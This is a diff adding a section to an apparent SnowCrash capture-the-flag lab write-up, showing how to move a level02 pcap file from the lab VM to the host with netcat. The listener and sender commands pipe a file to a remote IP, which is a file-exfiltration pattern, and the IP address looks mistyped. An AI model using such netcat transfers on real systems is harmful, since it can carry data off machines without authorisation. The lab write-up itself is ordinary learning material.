@@ -86,3 +86,25 @@ When I changed it to **Host-only Adapter** the issue was resolved.
 
 Hopefully those who are on Mac are having easier time here and not dealing with weird VirtualBox bugs.
 
+### Alternatively 
+
+You can also use netcat to transfer files like so:
+
+First, we start listening on port 4444. `nc -l -p 4444 > level02.pcap`
+
+![image](https://github.com/user-attachments/assets/7edb672c-d09b-4c37-84e0-afb69061f4ff)
+
+Then we send the file `level02@SnowCrash:~$  nc -w 3 92.168.56.102 4444 < level02.pcap`
+
+![image](https://github.com/user-attachments/assets/dbbf836c-5505-4b46-b994-e101a044c5ae)
+
+(if you don't know your ip you can just run `$ ifconfig`)
+
+![image](https://github.com/user-attachments/assets/36567e8d-1783-4401-8352-facb571c13aa)
+
+
+Now let's check our home directory.
+
+![image](https://github.com/user-attachments/assets/b6d22e80-f4e2-4f12-a5a2-b3a5320ed581)
+
+Ta-da!
